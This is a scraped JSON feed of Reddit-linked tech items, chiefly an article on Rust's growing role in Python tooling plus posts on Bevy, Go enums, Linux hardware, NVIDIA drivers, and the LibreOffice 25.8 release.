href=\"https://thenewstack.io/rust-programming-language-guide/\">Rust</a> has emerged as <a href=\"https://thenewstack.io/why-python-is-so-slow-and-what-is-being-done-about-it/\">Python’s performance</a> co-pilot.</p><h2>The Rust Revolution in Python</h2><p>In a <a href=\"https://blog.jetbrains.com/pycharm/2025/08/the-state-of-python-2025/\" rel=\"external \" onclick=\"this.target='_blank';\">blog post</a> about the study — which was based on a survey of 30,000 developers — <a href=\"https://blog.jetbrains.com/pycharm/2025/08/the-state-of-python-2025/#author\" rel=\"external \" onclick=\"this.target='_blank';\">Michael Kennedy</a>, the founder of <a href=\"https://talkpython.fm/\" rel=\"external \" onclick=\"this.target='_blank';\">Talk Python</a> and a <a href=\"https://www.python.org/psf-landing/\" rel=\"external \" onclick=\"this.target='_blank';\">Python Software Foundation</a> Fellow, wrote that “At the <a href=\"https://us.pycon.org/2025/events/language-summit/\" rel=\"external \" onclick=\"this.target='_blank';\">2025 Python Language Summit</a>, core developers shared an eye-opening statistic: ‘Somewhere between one-quarter and one-third of all native code being uploaded to <a href=\"https://thenewstack.io/the-top-5-python-packages-and-what-they-do/\">PyPI</a> for new projects uses Rust.’ This means that when developers start new performance-critical Python projects today, they’re increasingly choosing Rust over traditional C extensions.”</p><h2>Why Rust Is Winning Over C</h2><p>Among the key reasons for Rust’s rapid adoption in the Python ecosystem is performance. Rust delivers C-level performance while maintaining Python’s ease of integration. Rust’s <a href=\"https://stackoverflow.com/questions/69178380/what-does-zero-cost-abstraction-mean\" rel=\"external \" onclick=\"this.target='_blank';\">zero-cost abstractions</a> and efficient memory management make it ideal for performance-critical components.</p><p>Rust also provides memory safety. Unlike C, Rust prevents common programming errors like <a href=\"https://thenewstack.io/secure-coding-in-c-avoid-buffer-overflows-and-memory-leaks/\">buffer overflows and memory leaks</a> at compile time. This makes it dramatically safer for extending Python without introducing security vulnerabilities or crashes.</p><p>In addition, Rust offers a high-quality developer experience with its modern toolchain, excellent error messages, and package manager (<a href=\"https://doc.rust-lang.org/cargo/\" rel=\"external \" onclick=\"this.target='_blank';\">Cargo</a>). It provides a better development experience compared to the often painful process of writing and debugging C extensions.</p><h2>Real-World Success Stories</h2><p>The Python ecosystem already showcases several high-profile Rust success stories:</p><ul><li> has revolutionized data science with DataFrame operations that often outperform <a href=\"https://thenewstack.io/python-pandas-ditches-numpy-for-speedier-pyarrow/\">Pandas</a> by orders of magnitude. Built in Rust, it provides a Python API that feels natural while delivering unprecedented speed for data processing tasks.</li><li> rewrote its core validation engine in Rust, resulting in dramatic performance improvements for data validation and serialization across virtually every Python discipline — from web APIs to machine learning pipelines.</li><li> increasingly relies on Rust-based components. The survey showed that <a href=\"https://thenewstack.io/jetbrains-developer-survey-tracks-rapid-adoption-of-ai-chatgpt/\">FastAPI</a> usage jumped from 29% to 38% (a 30% increase), partly driven by its async-friendly architecture that pairs well with Rust-based server components.</li></ul><h2>The Infrastructure Revolution</h2><p>Rust’s influence extends beyond individual packages to Python’s core infrastructure. Traditional Web Server Gateway Interface (WSGI) servers are giving way to Asynchronous Server Gateway Interface (ASGI) compatible alternatives, many of which are built with Rust. Kennedy cited <a href=\"https://github.com/emmett-framework/granian\" rel=\"external \" onclick=\"this.target='_blank';\">Granian</a>, a new Rust-based application server, as gaining significant traction. He also singled out <a href=\"https://www.uvicorn.org/\" rel=\"external \" onclick=\"this.target='_blank';\">Uvicorn</a>, which, while Python-based, increasingly integrates with Rust components</p><p>Kennedy also noted that two new Python type checkers have emerged, both written in Rust. One is <a href=\"https://github.com/astral-sh/ty\" rel=\"external \" onclick=\"this.target='_blank';\">ty</a> from <a href=\"https://astral.sh/\" rel=\"external \" onclick=\"this.target='_blank';\">Astral</a>, which is described as “an extremely fast Python type checker and language server.” The other is <a href=\"https://pyrefly.org/\" rel=\"external \" onclick=\"this.target='_blank';\">Pyrefly</a> from Meta, which is a high-performance alternative to traditional type checkers like <a href=\"https://mypy-lang.org/\" rel=\"external \" onclick=\"this.target='_blank';\">mypy</a>.</p><p>“They are both vying to be the next generation tooling for type checking. Moreover, both of these tools provide extremely fast language server protocols (LSPs), Kennedy wrote.</p><p>“Notice anything similar? They are both written in Rust, backing up the previous claim that ‘Rust has become Python’s performance co-pilot,’” he added.</p><p>Meanwhile, for enterprises, Rust-enhanced Python delivers tangible benefits. The performance improvements alone can translate into cost savings, including reduced cloud compute costs and lower memory usage. Moreover, faster response times improve customer satisfaction and more efficient code reduces energy consumption, Kennedy said.</p><h2>Advice for Python Developers</h2><p>Kennedy advised Python developers to learn to read Rust.</p><p>Python developers should consider learning the basics of Rust, not to replace Python, but to complement it.</p><p>“As I discussed in our analysis, Rust is becoming increasingly important in the most significant portions of the Python ecosystem,” Kennedy wrote. “I definitely don’t recommend that you become a Rust developer instead of a Pythonista, but being able to read basic Rust so that you understand what the libraries you’re consuming are doing will be a good skill to have.”</p><p>Kennedy also advised Python developers to embrace Rust-enhanced libraries. When choosing between similar packages, consider those with Rust cores — they often provide superior performance without sacrificing Python’s ease of use, he said.</p><p>And Python devs also should consider Rust for extensions, Kennedy advises. Python developers building performance-critical Python extensions should evaluate Rust as their implementation language instead of defaulting to C, he indicated.</p><p>Overall, Rust is not replacing Python — it’s supercharging it. This hybrid approach gives developers the best of both worlds: Python’s expressiveness and ecosystem for application logic, with Rust’s performance for computationally intensive components, the report expresses.</p><div><svg width=\"68px\" height=\"31px\" viewBox=\"0 0 68 31\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></svg></div>","contentLength":5228,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mvfi2x/rust_pythons_new_performance_engine/"},{"title":"Is Bevy really as unstable as their Introduction makes them out to be?","url":"https://www.reddit.com/r/rust/comments/1mvfamk/is_bevy_really_as_unstable_as_their_introduction/","date":1755697671,"author":"/u/VermicelliLanky3927","guid":235649,"unread":true,"content":"<p>Hai yall, first post on the sub, please let me know if there's anything I should change.</p><p>Although there are a number of well-maintained general purpose game engines listed on <a href=\"https://arewegameyet.rs/\">https://arewegameyet.rs/</a>, like Fyrox and BlueEngine, it seems like the one that is far and away the most popular is Bevy.</p><p>However, despite the fact that Bevy is, at this point, several years old, their <a href=\"https://bevy.org/learn/quick-start/introduction/\">introduction page</a> still claims that they are in the \"early stages of development\" and in particular mention that \"documentation is sparse\" and that every three months, they release a new version with breaking API changes.</p><p>This is odd to me because it always seemed to me that Bevy was highly mature (certainly moreso than many of the other projects on arewegameyet), and had amazing documentation. </p><p>I've been interested in using Bevy for a project for a while now, and this warning has deterred me up to this point, so I wanted to ask the community: For those of you that have used Bevy, what has your experience been like? If you've had to make changes because of an API change, how did migration treat you?</p><p>Thanks in advance, yall :3</p>","contentLength":1107,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The GPD Pocket 4 Mini is tiny, but geared for a professional audience (KVM, Card Reader, RS-232, 4G LTE options). Is there a way to have similar experience (w/ Linux) on one of the new gaming handhelds like Asus ROG X, Zotac Z One, Steam Deck, maybe with added keyboard/dock?","url":"https://gpdstore.net/gpd-mini-laptop/gpd-pocket-4/","date":1755697285,"author":"/u/spryfigure","guid":234786,"unread":true,"content":"<p>I will start by saying that for a such a tiny device the whole thing feels more like a quality laptop than a \"toy\" that you may expect. This is a serious piece of kit (as it should be at the price!) for getting work done.\nThe keyboard is very nice, compared to a Macbook Pro, it is like-for-like typing feel if a little constrained by the size which is to be expected.\n<p>Performance is exceptional, in fact, I am replacing my desktop Windows PC with it. The built in GPU seems up to the task - I would just say switch off things like FPS counters and benchmarking and just enjoy some games without worrying how many frames per second you are getting - it all feels fine which is the most important thing, many titles that are recent additions to Gamepass work flawlessly on it and you always have that USB 4 port if you want to explore using an eGPU later down the line.\n</p>As for the one annoyance, it's the screen, it is lovely to look at BUT they appear to have done something odd with the rotation, in all but Windows the screen is incorrectly rotated. I think they may have used a portrait orientated panel, as it is always 90 degrees counter clockwise rotated outside Windows. It can be corrected with settings, but makes it very hard to navigate things like GRUB bootloaders or the desktop until it is done via commands.</p>","contentLength":1322,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mvf4v3/the_gpd_pocket_4_mini_is_tiny_but_geared_for_a/"},{"title":"[R] Independent research uploaded to Zenodo: Exploring robotics, AI, and emotional intelligence frameworks","url":"https://www.reddit.com/r/MachineLearning/comments/1mvev9a/r_independent_research_uploaded_to_zenodo/","date":1755696630,"author":"/u/arthurmorgan18","guid":234662,"unread":true,"content":"<p>I’ve been working over the past two months on a set of independent research frameworks that connect AI, robotics, and human emotional resonance into unified systems. While I’m not part of a university or lab, I’ve documented and archived the work on Zenodo so it can be reviewed openly.</p><p>Some of the key ideas inside: • Eline Synch™ — motion &amp; emotional stabilization for humanoid robots. • EchoMind™ — AI protocol for dolphin communication and ecological repair. • Symbiont Class™ Robotics — merging Neuralink-style BCI, quantum AI, and emotion-aware robotics. • PowerMind™ — reimagining Tesla’s wireless energy vision with modern materials + AI.</p><p>This is early-stage conceptual research, not peer-reviewed, but it’s intended as a seed for discussion, critique, and potential collaboration. I’d love to hear feedback or pushback from this community, especially around feasibility and potential research directions.</p>","contentLength":947,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Dead Space creator is '100 percent' behind AI - 'it's here, just work with it'","url":"https://frvr.com/blog/news/dead-space-creator-is-100-percent-behind-ai-its-here-just-work-with-it/","date":1755695350,"author":"/u/Automatic_Can_9823","guid":234705,"unread":true,"content":"<p>Dead Space creator and Sledgehammer Games co-founder Glen Schofield has revealed he’s ‘100 percent’ behind the use of AI in the games industry.</p><p>Speaking the <a href=\"https://www.youtube.com/watch?v=m8jxDPe2Yqc\">The Games Business</a>, Schofield , who has the likes of Call of Duty, Legacy of Kain and Gex 3D on his resume, said he’s ‘looking forward’ to making another game, but highlighted that when it comes to AI to ‘just work with it’.</p><p>“AI is kicking in, and by the end of the game there will probably be enough AI to save even more money,” the Dead Space lead said. “I don’t know. Man, I am 100 percent behind [AI] because I have been there for a lot of these.</p><p>“I was there for the beginning of the internet, and they were like ‘yeah, the internet’… website, everybody’s going to have a website and now everybody does. So, AI is coming…it’s here, just work with it.”</p><p>Schofield revealed he was a ‘big fan’ of Midjourney, a popular generative art tool, in helping him create art and augment his creative process, claiming it ‘raises the bar’ and lets him dig ‘really, really, deep’.</p><p>“I remember when Photoshop was coming out. Now anybody who did airbrush or anything like that, they were out of work, right? Because computers are going to make it faster. I know how to undo. I now could add airbrush techniques within seconds and all that… but everything just got more complicated.</p><p>“I remember when motion capture was going to take jobs away. I look at animation departments now, it could be 30 people. It always raises the bar. It’s raising it now for me when I’m coming up with ideas and worlds.”</p><p>He added: “I dig really, really, really deep with AI stuff.”</p><p>Schofield, who is set to headline the business area conference at Gamescom Asia in Thailand, also revealed he’s not sure yet what jobs AI will end up creating for those in the games industry.  “I wish I could predict what jobs [will come out of it]. I hear people going we’re going to want prompt engineers,” he said. “And we probably will.”</p><p>Generative AI has been the most controversial form of artificial intelligence in reason years due to the use of copyrighted materials needed to train the technology. Numerous lawsuits have been started over the rise of generative AI with major corporations <a href=\"https://www.bbc.co.uk/news/articles/cg5vjqdm1ypo\">including Disney citing theft of copyrighted materials</a> and plagiarism as key issues with modern AI tools.</p><p>Additionally, there has been heavy pushback from gamers against the use of generative AI in video games. Titles like Call of Duty have been criticised for using tools like Midjourney for paid in-game skins and loading screens with many lambasting the use of these tools as ‘lazy’, especially when users are charged for non-human work. </p>","contentLength":2719,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mvecib/dead_space_creator_is_100_percent_behind_ai_its/"},{"title":"How Unforgiving Tools Help Your Programming Discipline with Michael Feathers","url":"https://youtube.com/shorts/3Z1uq0Vj5Ys","date":1755693119,"author":"/u/goto-con","guid":234784,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvdi0n/how_unforgiving_tools_help_your_programming/"},{"title":"[R] How do you make text labeling less painful?","url":"https://www.reddit.com/r/MachineLearning/comments/1mvdey9/r_how_do_you_make_text_labeling_less_painful/","date":1755692899,"author":"/u/vihanga2001","guid":234522,"unread":true,"content":"<p>Hey everyone! I'm working on a university research project about smarter ways to reduce the effort involved in labeling text datasets like support tickets, news articles, or transcripts.</p><p>The idea is to help teams <em>pick the most useful examples to label next</em>, instead of doing it randomly or all at once.</p><p>If you’ve ever worked on labeling or managing a labeled dataset, I’d love to ask you  about what made it slow, what you wish was better, and what would make it feel “worth it.”</p><p>Totally academic no tools, no sales, no bots. Just trying to make this research reflect real labeling experiences.</p><p>You can DM me or drop a comment if open to chat. Thanks so much</p>","contentLength":662,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Adding OCR to Spectacle","url":"https://www.reddit.com/r/linux/comments/1mvddws/adding_ocr_to_spectacle/","date":1755692819,"author":"/u/masterzeng","guid":234583,"unread":true,"content":"<p>EDIT: Hi again, as there seems to be interest in the project, I have created a <a href=\"https://github.com/kbkozlev/spectacle-ocr#\">GitHub</a> Repo and I'm welcoming contribution </p><p>I wanted to share with you my article regarding how you can integrate OCR into Spectacle.</p><p>This allows you to directly extract text from an image without having to use seperate apps or services.</p><p>Here is a <a href=\"https://kozlev.com/ocr-for-spectacle/\">link</a> to the article and a quick demo below</p>","contentLength":366,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Left my tech job after 11 months because they shifted me to a non tech job- did i just ruin my career?","url":"https://images.app.goo.gl/AFju4","date":1755692581,"author":"/u/Rough-Psychology-785","guid":234547,"unread":true,"content":"<a href=\"https://images.app.goo.gl/imghp\"><img src=\"https://images.app.goo.gl/images/branding/googlelogo/1x/googlelogo_color_92x36dp.png\" alt=\"Google Images\"></a><p>Expert reveals 'quickest way' to ruin your career</p><p>Images may be subject to copyright.</p>","contentLength":84,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvdame/left_my_tech_job_after_11_months_because_they/"},{"title":"Is this project worth my time?","url":"https://www.reddit.com/r/golang/comments/1mvchik/is_this_project_worth_my_time/","date":1755690323,"author":"/u/Dystorti0n","guid":235579,"unread":true,"content":"<p>I started building this tool about a year ago. I keep trying to revisit it but get busy. I have some time to continue working on it, but now trying to weigh up if it's useful enough to continue. <a href=\"https://github.com/Dyst0rti0n/easyhttps\">https://github.com/Dyst0rti0n/easyhttps</a> Basically, adding two lines to your code can turn your frontend, server etc to secure (HTTP -&gt; HTTPS).</p>","contentLength":337,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Why does NVIDIA still treat Linux like an afterthought?","url":"https://www.reddit.com/r/linux/comments/1mvcdk7/why_does_nvidia_still_treat_linux_like_an/","date":1755689992,"author":"/u/ISSELz","guid":234549,"unread":true,"content":"<p>It's so frustrating how little effort NVIDIA puts into supporting Linux. Drivers are unstable, sub-optimally tuned, and far behind their Windows counterparts. For a company that dominates the GPU market, it feels like Linux users get left out. Open-source solutions like Nouveau are worse because they don't even have good support from NVIDIA directly. If NVIDIA really cared about its community, it would take time and effort to make Linux drivers first-class and not an afterthought.</p>","contentLength":485,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is there a sane way to create effective namespaces for Go's \"enums\"?","url":"https://www.reddit.com/r/golang/comments/1mvc88b/is_there_a_sane_way_to_create_effective/","date":1755689548,"author":"/u/EmbarrassedBiscotti9","guid":234523,"unread":true,"content":"<p>Hello <a href=\"https://www.reddit.com/r/golang\">r/golang</a>. I am rather new to Go and I'm thoroughly Java-brained, so please bare with me.</p><p>I'm aware that Go doesn't have enums, but that something similar can be achieved using types, const, and iota.</p><p>After using this approach, I'm left mildly frustrated when referencing imported enums. This isn't an issue if only a single enum is declared within a package, but becomes a bit muddy if there are multiple (or numerous other unrelated constants).</p><p>E.g. if I had the package  containing Format and ColorModel:</p><pre><code>package enum type Format int const ( PNG Format = iota JPG WEBP ) type ColorModel int const ( GRAYSCALE ColorModel = iota RGB RGBA ARGB CMYK ) </code></pre><p>After importing  elsewhere, referencing values from either set of values doesn't provide any clear differentiation:</p><p>I'm wondering if there is a way to have the above instead be replaced with:</p><pre><code>Format.PNG ColorModel.GRAYSCALE </code></pre><p>I'm aware that creating a dedicated package per enum would work, but the constraint of one package per directory makes that pretty damn unappealing.</p><p>Ordinarily, I'd just stomach the imperfect solutions and crack on. At the moment, though, I'm working with a lot of data sourced from a Java project, and enums are . Something at least resembling enums feels like a must.</p><p>If any of you happen to know of a solution in line with what I'm looking for, I'd appreciate the insight. I'd also appreciate knowing if I'm wasting my time/breath!</p>","contentLength":1406,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"LibreOffice 25.8: smarter, faster and more reliable","url":"https://blog.documentfoundation.org/blog/2025/08/20/libreoffice-25-8/","date":1755689402,"author":"/u/themikeosguy","guid":234493,"unread":true,"content":"<p><strong>The best open source office suite continues to evolve, while maintaining its focus on privacy and digital sovereignty</strong></p><p>Berlin, 20 August 2025 – The Document Foundation announces the release of LibreOffice 25.8. This latest version of the market-leading free open source office suite maintains its focus on digital sovereignty and privacy protection. It offers individuals, organisations, and governments total control over their data and the most comprehensive productivity tools.</p><p>In a global context of growing concern about data privacy, cloud lock-in, and surveillance capitalism, LibreOffice 25.8 provides concrete solutions.</p><p>: The source code is available for inspection and is completely free from proprietary technology constraints.</p><p>: LibreOffice does not collect personal data, usage metrics or diagnostic information, and complies with the data protection regulations required by public administration implementations (GDPR).</p><p>: all features are executed locally on the user’s computer, without the need for an internet or cloud connection.</p><p><strong>Self-Hosted Collaboration</strong>: Integration with on-premises cloud solutions, such as Nextcloud, enables teams to collaborate without sharing information with Big Tech.</p><h3>LibreOffice 25.8: new performance and features</h3><p>: the Welcome/What’s New dialog now offers access to the user interface picker and appearance options, allowing new users to leverage LibreOffice’s flexible UI and personalise the look and feel according to their preferences.</p><p>: everything is faster, from startup to scrolling through large documents – with significant speed improvements on less powerful machines.</p><ul><li>In benchmark tests, Writer and Calc open files up to 30% faster.</li><li>Optimised memory management allows for smoother operation on virtual desktops and thin clients.</li></ul><p><strong>Better Interoperability with Microsoft Office files</strong>, with more accurate handling of DOCX, XLSX and PPTX files and fewer formatting issues, thanks to changes such as:</p><ul><li>a complete overhaul of word hyphenation and spacing</li><li>font management in Impress that is compatible with PowerPoint files</li><li>the addition of new functions in Calc: CHOOSECOLS, CHOOSEROWS, DROP, EXPAND, HSTACK, TAKE, TEXTAFTER, TEXTBEFORE, TEXTSPLIT, TOCOL, TOROW, VSTACK, WRAPCOLS and WRAPROWS.</li></ul><p>There are, of course, other important new features, such as the ability to export to the PDF 2.0 format, and several new ScriptForge library services. The complete list is available here: <a href=\"https://wiki.documentfoundation.org/ReleaseNotes/25.8\">wiki.documentfoundation.org/ReleaseNotes/25.8</a>.</p><p>In terms of operating system support changes, LibreOffice 25.8 will no longer run on Windows 7 or 8/8.1 versions. It is also the last version to run on macOS 10.15. Support for x86 (32-bit) Windows versions is deprecated.</p><h3>LibreOffice 25.8 for Businesses</h3><p>The Document Foundation collaborates with a global network of certified partners who offer enterprise-grade support and maintenance, customised features and integrations, and assistance with user migration and training. A full list of partners can be found here: <a href=\"https://www.libreoffice.org/get-help/professional-support/\">www.libreoffice.org/get-help/professional-support/</a>.</p><h3>Positioning of LibreOffice 25.8</h3><p>LibreOffice 25.8 is completely free and offers a viable alternative to proprietary office suites for individual users, schools, businesses, and public institutions. It contains no advertising, data tracking, or subscriptions.</p><p>It is ideal for students and teachers who need reliable tools for documents, presentations and data analysis, as well as for home users and freelancers looking for a solid, free alternative to Microsoft Office/365 or Google Docs. It is also ideal for public administrations and companies that value data sovereignty and the long-term accessibility of documents.</p><blockquote><p>LibreOffice 25.8 reaffirms our dedication to safeguarding the freedom and privacy of end users in the digital age. With this new release, we ensure that personal information stays where it belongs – with the individual. LibreOffice gives end users full control over their documents, helping them to avoid reliance on third-party platforms that might compromise their data or privacy. It’s about empowering users to work securely, independently and confidently, said Eliane Domingos, chairwoman of The Document Foundation.</p></blockquote><h3>About The Document Foundation</h3><p>The Document Foundation is a non-profit organisation that promotes open document formats and develops LibreOffice, the market-leading free open-source office suite. Its mission is to empower individuals and organisations to maintain control over their data and tools in an increasingly digital world dominated by closed platforms.</p>","contentLength":4536,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mvc6kd/libreoffice_258_smarter_faster_and_more_reliable/"}],"tags":["reddit"]}